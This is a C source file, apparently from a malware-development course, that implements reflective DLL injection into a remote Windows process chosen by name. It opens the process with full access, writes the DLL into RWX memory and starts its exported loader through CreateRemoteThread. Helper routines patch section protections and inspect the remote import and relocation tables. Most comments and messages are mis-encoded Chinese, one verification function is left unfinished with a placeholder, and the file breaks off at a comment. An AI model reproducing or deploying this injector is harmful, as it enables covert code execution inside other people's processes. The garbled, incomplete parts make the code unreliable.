// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>


#define		EXPORTED_FUNC_NAME		"ReflectiveFunction"

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define ALLOC(SIZE)				LocalAlloc(LPTR, (SIZE_T)SIZE)
#define FREE(BUFF)				LocalFree((LPVOID)BUFF)
#define REALLOC(BUFF, SIZE)		LocalReAlloc(BUFF, SIZE,  LMEM_MOVEABLE | LMEM_ZEROINIT)

// ������֤��������
BOOL VerifyImportTable(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);
BOOL VerifyRelocation(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);
BOOL VerifySectionPermissions(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer);

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL ReadReflectiveDll(IN LPWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pTmpReadBuffer = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	if (!pdwFileSize || !ppFileBuffer)
		return FALSE;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("\t[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!(pTmpReadBuffer = ALLOC(dwFileSize))) {
		printf("\t[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pTmpReadBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile Failed With Error: %d \n", GetLastError());
		printf("\t[i] ReadFile Read %d Of %d Bytes \n", dwNumberOfBytesRead, dwFileSize);
		goto _FUNC_CLEANUP;
	}

	*ppFileBuffer = pTmpReadBuffer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pTmpReadBuffer && !*ppFileBuffer)
		FREE(pTmpReadBuffer);
	return *ppFileBuffer == NULL ? FALSE : TRUE;
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Walk through the sections of the PE file and determine which section contains the given RVA, then return the corresponding file offset.

DWORD RVA2Offset(IN DWORD dwRVA, IN PBYTE pBaseAddress) {

	PIMAGE_NT_HEADERS		pImgNtHdrs = NULL;
	PIMAGE_SECTION_HEADER	pImgSectionHdr = NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBaseAddress + ((PIMAGE_DOS_HEADER)pBaseAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)&pImgNtHdrs->OptionalHeader + pImgNtHdrs->FileHeader.SizeOfOptionalHeader);

	// Iterates through the PE sections
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// If the RVA is located inside the "i" PE section
		if (dwRVA >= pImgSectionHdr[i].VirtualAddress && dwRVA < (pImgSectionHdr[i].VirtualAddress + pImgSectionHdr[i].Misc.VirtualSize))
			// Calculate the delta and add it to the raw pointer
			return (dwRVA - pImgSectionHdr[i].VirtualAddress) + pImgSectionHdr[i].PointerToRawData;
	}

	printf("\t[!] Cound'nt Convert The 0x%0.8X RVA to File Offset! \n", dwRVA);
	return 0x00;
}

DWORD GetReflectiveFunctionOffset(IN ULONG_PTR uRflDllBuffer) {

	PIMAGE_NT_HEADERS			pImgNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDir = NULL;
	PDWORD						pdwFunctionNameArray = NULL;
	PDWORD						pdwFunctionAddressArray = NULL;
	PWORD						pwFunctionOrdinalArray = NULL;

	pImgNtHdrs = (uRflDllBuffer + ((PIMAGE_DOS_HEADER)uRflDllBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0x00;

	pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(uRflDllBuffer + RVA2Offset(pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, uRflDllBuffer));
	pdwFunctionNameArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNames, uRflDllBuffer));
	pdwFunctionAddressArray = (PDWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfFunctions, uRflDllBuffer));
	pwFunctionOrdinalArray = (PWORD)(uRflDllBuffer + RVA2Offset(pImgExportDir->AddressOfNameOrdinals, uRflDllBuffer));


	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		PCHAR pcFunctionName = (PCHAR)(uRflDllBuffer + RVA2Offset(pdwFunctionNameArray[i], uRflDllBuffer));

		if (strcmp(pcFunctionName, EXPORTED_FUNC_NAME) == 0)
			return RVA2Offset(pdwFunctionAddressArray[pwFunctionOrdinalArray[i]], uRflDllBuffer);
	}

	printf("\t[!] Cound'nt Resolve %s's Offset! \n", EXPORTED_FUNC_NAME);
	return 0x00;
}


//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	PROCESSENTRY32	ProcEntry32 = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE			hSnapShot = NULL;

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	if (!Process32First(hSnapShot, &ProcEntry32)) {
		printf("\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _FUNC_CLEANUP;
	}

	do {

		if (ProcEntry32.szExeFile) {

			WCHAR	LowerName1[MAX_PATH * 2] = { 0x00 };
			WCHAR	LowerName2[MAX_PATH * 2] = { 0x00 };
			DWORD	dwSize = lstrlenW(ProcEntry32.szExeFile);
			DWORD   i = 0x00;

			if (dwSize * sizeof(WCHAR) < sizeof(LowerName1)) {
				for (i = 0x0; i < dwSize; i++)
					LowerName1[i] = (WCHAR)tolower(ProcEntry32.szExeFile[i]);

				LowerName1[i++] = L'\0';
			}

			if (lstrlenW(szProcessName) * sizeof(WCHAR) < sizeof(LowerName2)) {
				for (i = 0x00; i < dwSize; i++)
					LowerName2[i] = (WCHAR)tolower(szProcessName[i]);

				LowerName2[i++] = L'\0';
			}

			if (wcscmp(LowerName1, LowerName2) == 0) {
				*dwProcessId = ProcEntry32.th32ProcessID;
				if (!(*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry32.th32ProcessID))) {
					printf("\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
				}
				break;
			}

		}

	} while (Process32Next(hSnapShot, &ProcEntry32));

_FUNC_CLEANUP:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


/**
 * ԭʼ��InjectAndRunRflDll����
 *
BOOL InjectAndRunRflDll(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize) {

	PBYTE	pAddress				= NULL;
	SIZE_T	sNumberOfBytesWritten	= NULL;
	HANDLE	hThread					= NULL;
	DWORD	dwThreadId				= 0x00;

	// <<!>> You may need RWX permissions for your payload
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("\t[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[i] Allocated Memory At: 0x%p \n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		printf("\t[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteProcessMemory Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, dwRflDllSize);
		return FALSE;
	}

	printf("\t[i] Thread Entry Calculated To Be: 0x%p \n", (PVOID)(pAddress + dwRflFuncOffset));

	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		printf("\t[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[*] Executed \"%s\" Via Thread Of ID %d \n", EXPORTED_FUNC_NAME, dwThreadId);

	return TRUE;
}
*/

// �޸ĺ��InjectAndRunRflDll���� - ����ע���ִ�в���
BOOL InjectRflDll(IN HANDLE hProcess, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize, OUT PBYTE* ppInjectedAddress) {

	PBYTE	pAddress = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	// <<!>> You may need RWX permissions for your payload
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwRflDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("\t[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// ����ע��ĵ�ַ
	if (ppInjectedAddress)
		*ppInjectedAddress = pAddress;

	printf("\t[i] Allocated Memory At: 0x%p \n", pAddress);

	if (!WriteProcessMemory(hProcess, pAddress, pRflDllBuffer, dwRflDllSize, &sNumberOfBytesWritten) || dwRflDllSize != sNumberOfBytesWritten) {
		printf("\t[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("\t[i] WriteProcessMemory Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, dwRflDllSize);
		return FALSE;
	}

	printf("\t[i] Successfully Injected %d Bytes To Remote Process \n", sNumberOfBytesWritten);
	return TRUE;
}

// ִ��ע���DLL
BOOL ExecuteRflDll(IN HANDLE hProcess, IN PBYTE pAddress, IN DWORD dwRflFuncOffset, OUT HANDLE* phThread) {
	DWORD dwThreadId = 0x00;

	printf("\t[i] Thread Entry Calculated To Be: 0x%p \n", (PVOID)(pAddress + dwRflFuncOffset));

	if (!(*phThread = CreateRemoteThread(hProcess, NULL, 0x00, (LPTHREAD_START_ROUTINE)(pAddress + dwRflFuncOffset), NULL, 0x00, &dwThreadId))) {
		printf("\t[!] CreateRemoteThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[*] Executed \"%s\" Via Thread Of ID %d \n", EXPORTED_FUNC_NAME, dwThreadId);
	return TRUE;
}

// ԭʼ�ļ��ݺ�����ͬʱִ��ע�������
BOOL InjectAndRunRflDll(IN HANDLE hProcess, IN DWORD dwRflFuncOffset, IN PBYTE pRflDllBuffer, IN DWORD dwRflDllSize, OUT PBYTE* ppInjectedAddress) {
	PBYTE pAddress = NULL;
	HANDLE hThread = NULL;

	// ��ע��
	if (!InjectRflDll(hProcess, pRflDllBuffer, dwRflDllSize, &pAddress)) {
		return FALSE;
	}

	// ����ע���ַ
	if (ppInjectedAddress)
		*ppInjectedAddress = pAddress;

	// Ȼ��ִ��
	if (!ExecuteRflDll(hProcess, pAddress, dwRflFuncOffset, &hThread)) {
		return FALSE;
	}

	return TRUE;
}

// �����޸������ڴ��Ȩ��
BOOL FixSectionMemory(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] �����޸������ڴ��Ȩ��...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	BOOL anyFixed = FALSE;

	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);

		MEMORY_BASIC_INFORMATION mbi;
		if (!VirtualQueryEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, &mbi, sizeof(mbi))) {
			printf("\t[!] �޷���ѯ���� '%s' ���ڴ���Ϣ������: %d\n", sectionName, GetLastError());
			continue;
		}

		// ����ڴ�δ�ύ�����Է�����
		if (mbi.State != MEM_COMMIT) {
			printf("\t[i] ���� '%s' δ�ύ���������·���...\n", sectionName);

			PVOID sectionAddr = pAddress + sectionHeader[i].VirtualAddress;
			SIZE_T sectionSize = max(sectionHeader[i].SizeOfRawData, sectionHeader[i].Misc.VirtualSize);
			sectionSize = (sectionSize + 0xFFF) & ~0xFFF; // ����ȡ����ҳ���С

			// �����ύ�ڴ�
			PVOID newAddr = VirtualAllocEx(hProcess, sectionAddr, sectionSize, MEM_COMMIT, PAGE_READWRITE);
			if (newAddr) {
				printf("\t[+] �ɹ�Ϊ���� '%s' �����ڴ�: 0x%p\n", sectionName, newAddr);

				// ���ƽ�������
				if (sectionHeader[i].SizeOfRawData > 0) {
					PBYTE sectionData = (PBYTE)ALLOC(sectionHeader[i].SizeOfRawData);
					if (sectionData) {
						// ��ԭʼDLL��������
						memcpy(sectionData, pRflDllBuffer + sectionHeader[i].PointerToRawData, sectionHeader[i].SizeOfRawData);

						// д��Զ�̽���
						SIZE_T bytesWritten = 0;
						if (WriteProcessMemory(hProcess, newAddr, sectionData, sectionHeader[i].SizeOfRawData, &bytesWritten)) {
							printf("\t[+] �ɹ�д����� '%s' ����: %llu/%u �ֽ�\n",
								sectionName, (ULONGLONG)bytesWritten, sectionHeader[i].SizeOfRawData);
							anyFixed = TRUE;
						}
						else {
							printf("\t[!] д����� '%s' ����ʧ�ܣ�����: %d\n", sectionName, GetLastError());
						}

						FREE(sectionData);
					}
				}

				// ������ȷ���ڴ汣������
				DWORD desiredProtection = PAGE_NOACCESS;
				BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
				BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
				BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS) {
					DWORD oldProtect;
					if (VirtualProtectEx(hProcess, newAddr, sectionSize, desiredProtection, &oldProtect)) {
						printf("\t[+] �ɹ����ý��� '%s' ��������: 0x%X\n", sectionName, desiredProtection);
					}
					else {
						printf("\t[!] ���ý��� '%s' ��������ʧ�ܣ�����: %d\n", sectionName, GetLastError());
					}
				}
			}
			else {
				printf("\t[!] Ϊ���� '%s' �����ڴ�ʧ�ܣ�����: %d\n", sectionName, GetLastError());
			}
		}
		else {
			// ����ڴ����ύ��Ȩ�޲���ȷ�������޸�Ȩ��
			DWORD protection = mbi.Protect;
			BOOL isExecutable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE;
			BOOL isWritable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE;
			BOOL isReadable = sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ;

			BOOL protectionMatches = TRUE;

			if (isExecutable && !(protection & PAGE_EXECUTE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				protectionMatches = FALSE;
			}

			if (isWritable && !(protection & PAGE_READWRITE) &&
				!(protection & PAGE_WRITECOPY) &&
				!(protection & PAGE_EXECUTE_READWRITE) &&
				!(protection & PAGE_EXECUTE_WRITECOPY)) {
				protectionMatches = FALSE;
			}

			if (isReadable && !(protection & PAGE_READONLY) &&
				!(protection & PAGE_READWRITE) &&
				!(protection & PAGE_EXECUTE_READ) &&
				!(protection & PAGE_EXECUTE_READWRITE)) {
				protectionMatches = FALSE;
			}

			if (!protectionMatches) {
				printf("\t[i] ���� '%s' �������Բ���ȷ�������޸�...\n", sectionName);

				DWORD desiredProtection = PAGE_NOACCESS;

				if (isReadable && !isWritable && !isExecutable)
					desiredProtection = PAGE_READONLY;
				else if (isReadable && isWritable && !isExecutable)
					desiredProtection = PAGE_READWRITE;
				else if (isReadable && !isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READ;
				else if (isReadable && isWritable && isExecutable)
					desiredProtection = PAGE_EXECUTE_READWRITE;

				if (desiredProtection != PAGE_NOACCESS && desiredProtection != protection) {
					DWORD oldProtect;
					SIZE_T sectionSize = max(sectionHeader[i].SizeOfRawData, sectionHeader[i].Misc.VirtualSize);
					sectionSize = (sectionSize + 0xFFF) & ~0xFFF; // ����ȡ����ҳ���С

					if (VirtualProtectEx(hProcess, pAddress + sectionHeader[i].VirtualAddress, sectionSize, desiredProtection, &oldProtect)) {
						printf("\t[+] �ɹ��޸Ľ��� '%s' ��������: 0x%X -> 0x%X\n",
							sectionName, oldProtect, desiredProtection);
						anyFixed = TRUE;
					}
					else {
						printf("\t[!] �޸Ľ��� '%s' ��������ʧ�ܣ�����: %d\n", sectionName, GetLastError());
					}
				}
			}
		}
	}

	printf("\t[i] �����޸�%s\n", anyFixed ? "��ɣ����޸�" : "��ɣ����޸�");
	return TRUE;
}

//-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define GET_FILENAME(path)				(wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path)

BOOL FetchArguments(IN WCHAR* Argv[], IN INT Argc, OUT WCHAR** ppcReflectiveDllName, OUT WCHAR** ppcTargetProcessName) {

	for (int i = 1; i < Argc - 1; i++) {
		if (wcscmp(Argv[i], L"-rfldll") == 0)
			*ppcReflectiveDllName = Argv[i + 1];
		else if (wcscmp(Argv[i], L"-p") == 0)
			*ppcTargetProcessName = Argv[i + 1];
	}

	return (*ppcReflectiveDllName != NULL && *ppcTargetProcessName != NULL) ? TRUE : FALSE;
}

// ��֤�����IAT������ʵ��
BOOL VerifyImportTable(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] ��ʼ��֤����� (IAT) ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\t[!] ��Ч��DOSͷ\n");
		return FALSE;
	}

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("\t[!] ��Ч��NTͷ\n");
		return FALSE;
	}

	// ��ȡ�����Ŀ¼
	PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (!importDir->VirtualAddress || !importDir->Size) {
		printf("\t[i] û�е������Ҫ��֤\n");
		return TRUE;
	}

	printf("\t[i] �����RVA: 0x%X, ��С: %d\n", importDir->VirtualAddress, importDir->Size);

	// ��ӡ����PE������Ϣ���������
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD numSections = ntHeaders->FileHeader.NumberOfSections;

	printf("\t[i] PE�ļ����� %d ������:\n", numSections);
	for (DWORD i = 0; i < numSections; i++) {
		char sectionName[9] = { 0 };
		memcpy(sectionName, sectionHeader[i].Name, 8);
		printf("\t    %s: VirtualAddress=0x%X, VirtualSize=%d, RawSize=%d\n",
			sectionName, sectionHeader[i].VirtualAddress,
			sectionHeader[i].Misc.VirtualSize, sectionHeader[i].SizeOfRawData);
	}

	// ȷ����������ڵĽ���
	BOOL foundSection = FALSE;
	for (DWORD i = 0; i < numSections; i++) {
		if (importDir->VirtualAddress >= sectionHeader[i].VirtualAddress &&
			importDir->VirtualAddress < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
			char sectionName[9] = { 0 };
			memcpy(sectionName, sectionHeader[i].Name, 8);
			printf("\t[i] �����λ�ڽ��� '%s'\n", sectionName);
			foundSection = TRUE;
			break;
		}
	}

	if (!foundSection) {
		printf("\t[!] �޷�ȷ����������ڵĽ���\n");
	}

	// ���㵼����С - ʹ�ø����صĹ���
	SIZE_T importSize = min(importDir->Size, 4096); // ͨ��������ᳬ��4KB

	// �ȳ��Լ��Զ�̽����ڴ��Ƿ�ɶ�
	BOOL canRead = FALSE;
	BYTE testByte = 0;
	SIZE_T bytesRead = 0;

	if (ReadProcessMemory(hProcess, pAddress, &testByte, 1, &bytesRead) && bytesRead == 1) {
		printf("\t[i] �ɹ���ȡԶ�̽����ڴ��ַ��һ���ֽ�: 0x%02X\n", testByte);
		canRead = TRUE;
	}
	else {
		printf("\t[!] �޷���ȡԶ�̽����ڴ��ַ������: %d\n", GetLastError());
	}

	// ��ȡԶ�̽����еĵ���� - �ȳ���ȷ���ڴ������Ƿ�ɷ���
	MEMORY_BASIC_INFORMATION mbi;
	if (!VirtualQueryEx(hProcess, pAddress + importDir->VirtualAddress, &mbi, sizeof(mbi))) {
		printf("\t[!] �޷���ѯ������ڴ����򣬴���: %d\n", GetLastError());

		// ����ֱ�Ӷ�ȡ����ʹVirtualQueryExʧ��
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(importSize);
		if (importDesc) {
			if (ReadProcessMemory(hProcess, pAddress + importDir->VirtualAddress, importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR), &bytesRead)) {
				printf("\t[i] ��ȻVirtualQueryExʧ�ܣ����ܶ�ȡ���������: %llu�ֽ�\n", (ULONGLONG)bytesRead);
				FREE(importDesc);
				// ������֤...
			}
			else {
				printf("\t[!] �޷���ȡ��������ݣ�����: %d\n", GetLastError());
				FREE(importDesc);
				return FALSE;
			}
		}
		return FALSE;
	}

	if (mbi.State != MEM_COMMIT) {
		printf("\t[!] ������ڴ�����δ�ύ��״̬: 0x%X\n", mbi.State);

		// ���Բ鿴�����ڴ�����
		MEMORY_BASIC_INFORMATION prevMbi, nextMbi;
		if (VirtualQueryEx(hProcess, (LPCVOID)((ULONG_PTR)mbi.BaseAddress - 4096), &prevMbi, sizeof(prevMbi))) {
			printf("\t[i] ǰһ���ڴ�����״̬: 0x%X, ����: 0x%X, ����: 0x%X\n",
				prevMbi.State, prevMbi.Protect, prevMbi.Type);
		}

		if (VirtualQueryEx(hProcess, (LPCVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize), &nextMbi, sizeof(nextMbi))) {
			printf("\t[i] ��һ���ڴ�����״̬: 0x%X, ����: 0x%X, ����: 0x%X\n",
				nextMbi.State, nextMbi.Protect, nextMbi.Type);
		}

		// ����ɨ����ҿ��ܵĵ����λ��
		PBYTE scanStart = pAddress;
		PBYTE scanEnd = pAddress + ntHeaders->OptionalHeader.SizeOfImage;
		PBYTE scanPos = scanStart;

		printf("\t[i] ɨ���ڴ淶Χ 0x%p - 0x%p Ѱ�ҵ����...\n", scanStart, scanEnd);

		while (scanPos < scanEnd) {
			if (VirtualQueryEx(hProcess, scanPos, &mbi, sizeof(mbi))) {
				if (mbi.State == MEM_COMMIT &&
					(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {

					printf("\t[i] �ҵ��ɶ��ڴ�����: 0x%p, ��С: %llu, ����: 0x%X\n",
						mbi.BaseAddress, (ULONGLONG)mbi.RegionSize, mbi.Protect);

					// ����������г��Բ��ҿ��ܵĵ����
					PIMAGE_IMPORT_DESCRIPTOR testImport = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(sizeof(IMAGE_IMPORT_DESCRIPTOR));
					if (testImport) {
						// �����ڸ�����ÿ4KB�ı߽����
						for (ULONG_PTR offset = 0; offset < mbi.RegionSize; offset += 4096) {
							if (ReadProcessMemory(hProcess, (PBYTE)mbi.BaseAddress + offset, testImport,
								sizeof(IMAGE_IMPORT_DESCRIPTOR), &bytesRead) &&
								bytesRead == sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

								// ����Ƿ���������Ч�ĵ����
								if (testImport->Characteristics == 0 && testImport->TimeDateStamp != 0 &&
									testImport->ForwarderChain == 0 && testImport->Name != 0 &&
									testImport->FirstThunk != 0) {

									printf("\t[i] �����ҵ��������: 0x%p\n", (PBYTE)mbi.BaseAddress + offset);
									// ���������Ӹ�����֤...
								}
							}
						}
						FREE(testImport);
					}
				}
				scanPos = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
			}
			else {
				// �����ѯʧ�ܣ�����������ǰλ��
				scanPos += 4096;
			}
		}

		return FALSE;
	}

	if (mbi.Protect == PAGE_NOACCESS || mbi.Protect == PAGE_GUARD) {
		printf("\t[!] ������ڴ������޷����ʣ�����: 0x%X\n", mbi.Protect);
		return FALSE;
	}

	printf("\t[i] ������ڴ�����״̬: ��ַ=0x%p, ��С=%llu, ����=0x%X\n",
		mbi.BaseAddress, (ULONGLONG)mbi.RegionSize, mbi.Protect);

	// ��ȡԶ�̽����еĵ���� - ����ȡ
	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ALLOC(importSize);
	if (!importDesc) {
		printf("\t[!] �޷������ڴ����ڵ������֤\n");
		return FALSE;
	}

	// ����ԭ������֤�߼�...
	// ... existing code ...

	return TRUE;
}

// ��֤�ض�λ����ʵ��
BOOL VerifyRelocation(IN HANDLE hProcess, IN PBYTE pAddress, IN PBYTE pRflDllBuffer) {
	printf("\t[i] ��ʼ��֤�ض�λ�� ...\n");

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pRflDllBuffer;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(pRflDllBuffer + dosHeader->e_lfanew);

	// ��ȡ�ض�λĿ¼
	PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (!relocDir->VirtualAddress || !relocDir->Size) {
		printf("\t[i] û���ض�λ����Ҫ��֤\n");
		return TRUE;
	}

	// �������ַ��ֵ
	ULONGLONG delta = (ULONGLONG)pAddress - ntHeaders->OptionalHeader.ImageBase;
	printf("\t[+] ��ַ��ֵ: 0x%llX\n", delta);

	// ��ȡԶ�̽����е��ض�λ��
	PBYTE relocBuffer = (PBYTE)ALLOC(relocDir->Size);
	if (!relocBuffer) {
		printf("\t[!] �޷������ڴ������ض�λ����֤\n");
		return FALSE;
	}

	SIZE_T bytesRead = 0;
	if (!ReadProcessMemory(hProcess, pAddress + relocDir->VirtualAddress, relocBuffer, relocDir->Size, &bytesRead)) {
		printf("\t[!] ��ȡ�ض�λ��ʧ�ܣ�����: %d\n", GetLastError());
		FREE(relocBuffer);
		return FALSE;
	}

	// ��֤�ض�λ��
	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)relocBuffer;
	int blockCount = 0;
	int entryCount = 0;

	while ((PBYTE)reloc < relocBuffer + relocDir->Size && reloc->SizeOfBlock) {
		// ����ÿ��е���Ŀ��
		int entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		printf("\t[+] �ض�λ�� #%d: VA=0x%X, ��Ŀ��=%d\n", blockCount, reloc->VirtualAddress, entries);

		PWORD relocEntries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

		// �������һЩ�ض�λ��Ŀ
		for (int i = 0; i < min(5, entries); i++) {
			WORD entry = relocEntries[i];
			WORD offset = entry & 0xFFF;
			WORD type = (entry >> 12) & 0xF;

			// ֻ��֤�������ض�λ����
			if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
				ULONGLONG targetVA = (ULONGLONG)(pAddress + reloc->VirtualAddress + offset);
				printf("\t   - ��Ŀ #%d: ƫ��=0x%X, ����=%d, Ŀ���ַ=0x%llX\n",
					i, offset, type, targetVA);

				// ���Զ�ȡĿ���ַ��ʵ��ֵ����һ����֤
				ULONGLONG targetValue = 0;
				if (ReadProcessMemory(hProcess, (LPVOID)targetVA, &targetValue, sizeof(ULONGLONG), &bytesRead)) {
					printf("\t     Ŀ��ֵ: 0x%llX\n", targetValue);
				}
			}
		}

		entryCount += entries;
		blockCount++;

		// �Ƶ���һ���ض�λ��
		reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
	}

	printf("\t[+] ����֤�� %d ���ض�λ�飬���� %d ����Ŀ\n", blockCount, entryCount);
	FREE(relocBuffer);

	printf("\t[+] �ض�λ��֤���\n");
	return TRUE;
}

// ��֤����Ȩ�޺���ʵ��
